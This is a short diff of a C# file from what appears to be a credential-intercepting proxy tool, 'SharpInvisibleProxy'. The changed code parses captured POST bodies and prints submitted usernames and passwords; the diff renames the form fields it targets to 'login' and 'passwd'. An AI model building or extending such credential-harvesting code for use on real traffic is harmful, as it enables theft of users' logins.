@@ -25,10 +25,10 @@ namespace SharpInvisibleProxy
             var parameters = ParseRequestBody(content);
 
             // Print specific POST parameters A and B
-            if (parameters.ContainsKey("username") && parameters.ContainsKey("password"))
+            if (parameters.ContainsKey("login") && parameters.ContainsKey("passwd"))
             {
-                string parameterA = parameters["username"];
-                string parameterB = parameters["password"];
+                string parameterA = parameters["login"];
+                string parameterB = parameters["passwd"];
 
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("[+] Username: " + parameterA);
